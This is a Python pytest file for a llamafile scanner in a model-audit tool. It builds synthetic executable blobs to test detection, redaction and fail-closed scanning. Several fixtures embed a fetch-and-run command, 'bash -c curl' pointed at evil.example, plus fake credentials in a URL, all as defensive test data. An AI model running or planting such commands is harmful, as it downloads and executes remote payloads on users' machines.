from __future__ import annotations

import struct
from pathlib import Path

import pytest

from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.core import determine_exit_code, scan_model_directory_or_file
from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, IssueSeverity
from modelaudit.scanners.llamafile_scanner import (
    LLAMAFILE_PAYLOAD_SCAN_LIMIT_REASON,
    LLAMAFILE_ROUTE_SCAN_BYTES,
    LLAMAFILE_ROUTE_TAIL_SCAN_BYTES,
    LLAMAFILE_RUNTIME_PREVIEW_READ_REASON,
    LlamafileScanner,
)


def _build_llamafile_blob(
    *,
    runtime_lines: list[str] | None = None,
    include_marker: bool = True,
    embedded_payload: bytes | None = None,
) -> bytes:
    header = b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56
    marker = b"llamafile runtime\n" if include_marker else b"generic runtime\n"
    runtime = ("\n".join(runtime_lines or ["--threads 4", "--ctx-size 2048"])).encode("utf-8")
    payload = (
        embedded_payload if embedded_payload is not None else b"\x00" * 8192 + b"GGUF" + struct.pack("<IQQ", 3, 0, 0)
    )
    return header + marker + runtime + b"\x00" * 256 + payload


def test_llamafile_scanner_can_handle_detected_llamafile(tmp_path: Path) -> None:
    binary = tmp_path / "model.llamafile"
    binary.write_bytes(_build_llamafile_blob())

    assert LlamafileScanner.can_handle(str(binary))


def test_llamafile_scanner_can_handle_detected_llamafile_with_misleading_suffix(tmp_path: Path) -> None:
    binary = tmp_path / "payload.jpg"
    binary.write_bytes(_build_llamafile_blob())

    assert LlamafileScanner.can_handle(str(binary))


def test_llamafile_scanner_does_not_misclassify_generic_executable(tmp_path: Path) -> None:
    generic_exe = tmp_path / "tool.exe"
    generic_exe.write_bytes(b"MZ" + b"\x00" * 512 + b"normal executable")

    assert not LlamafileScanner.can_handle(str(generic_exe))


def test_llamafile_scanner_can_handle_middle_only_marker_in_exe(tmp_path: Path) -> None:
    binary = tmp_path / "middle-marker.exe"
    binary.write_bytes(
        b"MZ" + b"\x00" * 62 + b"A" * (2 * 1024 * 1024 + 64) + b"llamafile runtime" + b"B" * (2 * 1024 * 1024 + 64)
    )

    assert LlamafileScanner.can_handle(str(binary))


def test_llamafile_scanner_can_handle_casefolded_middle_marker_in_exe(tmp_path: Path) -> None:
    binary = tmp_path / "middle-marker-uppercase.exe"
    binary.write_bytes(
        b"MZ" + b"\x00" * 62 + b"A" * (2 * 1024 * 1024 + 64) + b"LLAMAFILE runtime" + b"B" * (2 * 1024 * 1024 + 64)
    )

    assert LlamafileScanner.can_handle(str(binary))


def test_llamafile_scanner_can_handle_malicious_middle_marker_in_exe(tmp_path: Path) -> None:
    binary = tmp_path / "middle-marker-malicious.exe"
    payload = _build_llamafile_blob(
        runtime_lines=["bash -c curl http://evil.example/payload.sh"],
        include_marker=False,
    )
    binary.write_bytes(
        b"MZ"
        + b"\x00" * 62
        + b"A" * (2 * 1024 * 1024 + 64)
        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
        + payload
    )

    result = LlamafileScanner().scan(str(binary))

    assert LlamafileScanner.can_handle(str(binary))
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_llamafile_scanner_flags_true_middle_runtime_strings(tmp_path: Path) -> None:
    binary = tmp_path / "middle-runtime.llamafile"
    binary.write_bytes(
        b"\x7fELF"
        + b"\x02\x01\x01\x00"
        + b"\x00" * 56
        + b"A" * (2 * 1024 * 1024)
        + b"bash -c curl http://evil.example/payload.sh"
        + b"B" * (1024 * 1024 - 512)
        + b"llamafile runtime\n"
        + b"B" * (2 * 1024 * 1024 + 64)
    )

    result = LlamafileScanner().scan(str(binary))

    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_llamafile_scanner_does_not_route_middle_near_match_in_exe(tmp_path: Path) -> None:
    binary = tmp_path / "middle-near-match.exe"
    binary.write_bytes(
        b"MZ" + b"\x00" * 62 + b"A" * (2 * 1024 * 1024 + 64) + b"llama-file runtime" + b"B" * (2 * 1024 * 1024 + 64)
    )

    assert not LlamafileScanner.can_handle(str(binary))


def test_llamafile_scanner_can_handle_does_not_scan_past_route_budget(tmp_path: Path) -> None:
    binary = tmp_path / "late-marker.exe"
    binary.write_bytes(
        b"MZ"
        + b"\x00" * 62
        + b"A" * LLAMAFILE_ROUTE_SCAN_BYTES
        + b"llamafile runtime"
        + b"B" * LLAMAFILE_ROUTE_TAIL_SCAN_BYTES
    )

    assert not LlamafileScanner.can_handle(str(binary))


def test_llamafile_scanner_can_handle_tail_only_marker_in_exe(tmp_path: Path) -> None:
    binary = tmp_path / "tail-marker.exe"
    binary.write_bytes(b"MZ" + b"\x00" * 62 + b"A" * (LLAMAFILE_ROUTE_SCAN_BYTES + 64) + b"llamafile runtime")

    assert LlamafileScanner.can_handle(str(binary))


def test_llamafile_scanner_benign_sample_has_no_high_severity(tmp_path: Path) -> None:
    binary = tmp_path / "safe.llamafile"
    binary.write_bytes(_build_llamafile_blob())

    result = LlamafileScanner().scan(str(binary))

    high_severity = [
        issue for issue in result.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
    ]
    assert high_severity == []
    assert result.metadata.get("embedded_payload_offset") is not None


def test_llamafile_runtime_preview_read_failure_is_inconclusive_not_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    binary = tmp_path / "unavailable-preview.llamafile"
    binary.write_bytes(_build_llamafile_blob())

    def raise_os_error(_path: Path, _num_bytes: int) -> bytes:
        raise OSError("simulated runtime preview read failure")

    monkeypatch.setattr(LlamafileScanner, "_read_prefix", staticmethod(raise_os_error))

    direct = LlamafileScanner().scan(str(binary))

    assert direct.success is False
    assert direct.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert LLAMAFILE_RUNTIME_PREVIEW_READ_REASON in direct.metadata.get("scan_outcome_reasons", [])
    read_checks = [check for check in direct.checks if check.name == "Llamafile Runtime Preview Read"]
    assert len(read_checks) == 1
    assert read_checks[0].severity == IssueSeverity.INFO
    assert read_checks[0].message == "Failed reading runtime preview bytes: simulated runtime preview read failure"
    assert read_checks[0].details.get("analysis_incomplete") is True
    assert read_checks[0].details.get("scan_outcome_reason") == LLAMAFILE_RUNTIME_PREVIEW_READ_REASON

    aggregate = scan_model_directory_or_file(str(binary), cache_scan_results=False)
    high_severity = [
        issue for issue in aggregate.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
    ]
    metadata = aggregate.file_metadata[str(binary)]
    assert high_severity == []
    assert metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert LLAMAFILE_RUNTIME_PREVIEW_READ_REASON in metadata.get("scan_outcome_reasons", [])
    assert determine_exit_code(aggregate) == 2

    cache_dir = tmp_path / "cache"
    reset_cache_manager()
    try:
        cached_aggregate = scan_model_directory_or_file(
            str(binary),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        cached_metadata = cached_aggregate.file_metadata[str(binary)]
        assert cached_aggregate.success is False
        assert cached_metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
        assert LLAMAFILE_RUNTIME_PREVIEW_READ_REASON in cached_metadata.get("scan_outcome_reasons", [])
        assert determine_exit_code(cached_aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_llamafile_late_preview_failure_retains_observed_runtime_findings(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    binary = tmp_path / "malicious-preview.llamafile"
    binary.write_bytes(_build_llamafile_blob(runtime_lines=["bash -c curl http://evil.example/payload.sh"]))

    def raise_os_error(_path: Path, _num_bytes: int) -> bytes:
        raise OSError("simulated suffix preview failure")

    monkeypatch.setattr(LlamafileScanner, "_read_suffix", staticmethod(raise_os_error))

    direct = LlamafileScanner().scan(str(binary))

    assert direct.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert direct.bytes_scanned > 0
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in direct.issues)

    aggregate = scan_model_directory_or_file(str(binary), cache_scan_results=False)
    assert determine_exit_code(aggregate) == 1
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in aggregate.issues)


def test_llamafile_middle_window_failure_retains_marker_probe_findings(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    binary = tmp_path / "malicious-middle-preview.llamafile"
    binary.write_bytes(
        b"\x7fELF"
        + b"\x02\x01\x01\x00"
        + b"\x00" * 56
        + b"A" * (2 * 1024 * 1024 + 64)
        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
        + b"B" * (2 * 1024 * 1024 + 64)
    )

    def raise_os_error(_path: Path, _offset: int, _num_bytes: int) -> bytes:
        raise OSError("simulated middle preview reread failure")

    monkeypatch.setattr(LlamafileScanner, "_read_window_around_offset", staticmethod(raise_os_error))

    result = LlamafileScanner().scan(str(binary))

    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_llamafile_scanner_flags_suspicious_runtime_strings(tmp_path: Path) -> None:
    binary = tmp_path / "suspicious.llamafile"
    binary.write_bytes(
        _build_llamafile_blob(
            runtime_lines=[
                "bash -c curl http://evil.example/payload.sh",
            ]
        )
    )

    result = LlamafileScanner().scan(str(binary))

    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
    assert runtime_issues
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)


def test_llamafile_scanner_redacts_sensitive_runtime_evidence(tmp_path: Path) -> None:
    binary = tmp_path / "sensitive-runtime.llamafile"
    binary.write_bytes(
        _build_llamafile_blob(
            runtime_lines=[
                'bash -c curl -H "Authorization: Bearer sk-runtime-secret1234567890" '
                "https://user:pass123@evil.example/payload?token=tok_runtime",
            ]
        )
    )

    result = LlamafileScanner().scan(str(binary))

    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
    assert runtime_issues
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)

    details = repr(runtime_issues[0].details)
    assert "sk-runtime-secret" not in details
    assert "pass123" not in details
    assert "tok_runtime" not in details
    assert "curl" in details
    assert "evil.example" in details
    assert "<redacted>" in details


def test_llamafile_scanner_does_not_skip_mixed_safe_and_suspicious_runtime_string(tmp_path: Path) -> None:
    binary = tmp_path / "mixed.llamafile"
    binary.write_bytes(
        _build_llamafile_blob(
            runtime_lines=[
                "llamafile curl http://evil.example/payload.sh",
            ]
        )
    )

    result = LlamafileScanner().scan(str(binary))

    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
    assert runtime_issues
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)


def test_llamafile_scanner_allows_known_safe_runtime_fragments(tmp_path: Path) -> None:
    binary = tmp_path / "safe-fragment.llamafile"
    binary.write_bytes(
        _build_llamafile_blob(
            runtime_lines=[
                "INFO llama server listening on http://127.0.0.1:8080",
            ]
        )
    )

    result = LlamafileScanner().scan(str(binary))

    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
    assert runtime_issues == []


def test_llamafile_scanner_flags_mixed_safe_fragment_and_command_tokens(tmp_path: Path) -> None:
    binary = tmp_path / "mixed-fragment.llamafile"
    binary.write_bytes(
        _build_llamafile_blob(
            runtime_lines=[
                "INFO llama server listening on http://127.0.0.1:8080 ; curl http://evil.example/payload.sh",
            ]
        )
    )

    result = LlamafileScanner().scan(str(binary))

    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
    assert runtime_issues
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)


@pytest.mark.parametrize(
    "runtime_line",
    [
        "%'18T connect(127.0.0.1:8080)",
        "%'18T connect(localhost)",
        "%'18T socket 127.0.0.1:8080",
        "%'18T socket 0.0.0.0:8080",
    ],
)
def test_llamafile_scanner_allows_local_endpoint_runtime_fragments(tmp_path: Path, runtime_line: str) -> None:
    binary = tmp_path / "local-endpoint-fragment.llamafile"
    binary.write_bytes(_build_llamafile_blob(runtime_lines=[runtime_line]))

    result = LlamafileScanner().scan(str(binary))

    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
    assert runtime_issues == []


@pytest.mark.parametrize(
    "runtime_line",
    [
        "INFO llama server listening on http://evil.example/payload.sh",
        "%'18T connect http://evil.example/payload.sh",
        "%'18T socket http://evil.example/payload.sh",
        "%'18T connect(evil.example:8080)",
        "%'18T socket evil.example:8080",
        "%'18T connect(10.0.0.8:8080)",
        "%'18T socket 192.168.1.10:8080",
        "%'18T connect(172.16.0.5:8080)",
    ],
)
def test_llamafile_scanner_flags_safe_fragments_with_remote_network_targets(tmp_path: Path, runtime_line: str) -> None:
    binary = tmp_path / "remote-network-fragment.llamafile"
    binary.write_bytes(_build_llamafile_blob(runtime_lines=[runtime_line]))

    result = LlamafileScanner().scan(str(binary))

    runtime_issues = [
        issue for issue in result.issues if "Executable runtime contains network indicators" in issue.message
    ]
    assert runtime_issues
    assert all(issue.severity == IssueSeverity.INFO for issue in runtime_issues)


def test_llamafile_scanner_handles_truncated_binary(tmp_path: Path) -> None:
    binary = tmp_path / "truncated.llamafile"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=b""))

    result = LlamafileScanner().scan(str(binary))

    assert result.success
    assert any("No embedded GGUF payload marker found" in issue.message for issue in result.issues)


def test_llamafile_scanner_fails_closed_when_payload_scan_window_ends_before_gguf(tmp_path: Path) -> None:
    binary = tmp_path / "late-payload.llamafile"
    late_payload = b"\x00" * 1024 + b"GGUF" + struct.pack("<IQQ", 3, 0, 0)
    binary.write_bytes(_build_llamafile_blob(embedded_payload=late_payload))

    result = LlamafileScanner(config={"llamafile_payload_scan_bytes": 256}).scan(str(binary))

    assert result.success is False
    assert result.metadata.get("analysis_incomplete") is True
    assert LLAMAFILE_PAYLOAD_SCAN_LIMIT_REASON in result.metadata.get("scan_outcome_reasons", [])
    payload_checks = [check for check in result.checks if check.name == "Llamafile Embedded Payload Detection"]
    assert payload_checks
    assert payload_checks[0].message == "No embedded GGUF payload marker found before bounded scan window ended"
    assert payload_checks[0].details.get("analysis_incomplete") is True

    aggregate = scan_model_directory_or_file(
        str(binary),
        llamafile_payload_scan_bytes=256,
        cache_scan_results=False,
    )
    metadata = aggregate.file_metadata[str(binary)]
    assert aggregate.success is False
    assert metadata.get("scan_outcome") == "inconclusive"
    assert LLAMAFILE_PAYLOAD_SCAN_LIMIT_REASON in metadata.get("scan_outcome_reasons", [])
    assert determine_exit_code(aggregate) == 2

    cache_dir = tmp_path / "cache"
    reset_cache_manager()
    try:
        cached_aggregate = scan_model_directory_or_file(
            str(binary),
            llamafile_payload_scan_bytes=256,
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        cached_metadata = cached_aggregate.file_metadata[str(binary)]

        assert cached_aggregate.success is False
        assert cached_metadata.get("scan_outcome") == "inconclusive"
        assert LLAMAFILE_PAYLOAD_SCAN_LIMIT_REASON in cached_metadata.get("scan_outcome_reasons", [])
        assert determine_exit_code(cached_aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_llamafile_embedded_gguf_findings_include_location_mapping(tmp_path: Path) -> None:
    binary = tmp_path / "embedded.llamafile"
    binary.write_bytes(_build_llamafile_blob())

    result = LlamafileScanner().scan(str(binary))

    embedded_checks = [check for check in result.checks if check.name.startswith("Llamafile Embedded")]
    assert embedded_checks
    assert any((check.location or "").startswith("llamafile:") for check in embedded_checks)
